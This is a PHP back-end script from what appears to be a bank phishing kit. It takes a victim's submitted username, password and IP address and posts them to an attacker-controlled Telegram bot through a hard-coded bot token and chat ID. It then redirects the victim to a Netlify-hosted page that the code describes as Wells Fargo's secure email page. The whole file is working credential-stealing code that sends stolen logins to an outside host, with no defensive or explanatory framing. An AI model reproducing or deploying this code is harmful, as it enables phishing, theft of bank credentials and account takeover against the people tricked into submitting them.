<?php

if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    header("location: /");
    die();
}

$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = getenv('REMOTE_ADDR');

// Telegram Bot settings
$bot_token = '5872606895:AAHA7Vb5pQJatd7s7HgCi70zRhL2rmhZtCE'; // Replace with your BotFather-generated bot token
$chat_id = '1312902699'; // Replace with your chat ID with BotFather

// Construct the message to be sent to BotFather
$message = "A US AA customer signed in now!\n\n" .
    "*uBake:* " . $user . "\n" .
    "*Pbake:* " . $pass . "\n" .
    "*Ip address:* " . $ip;

// Send the message to BotFather using Telegram Bot API
$url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
$data = array(
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
);
$options = array(
    'http' => array(
        'method' => 'POST',
        'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
        'ignore_errors' => true,
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Redirect the user to Wells Fargo's secure email page
header("location: https://startling-mermaid-1e794e.netlify.app/mailcenter.html");

?>
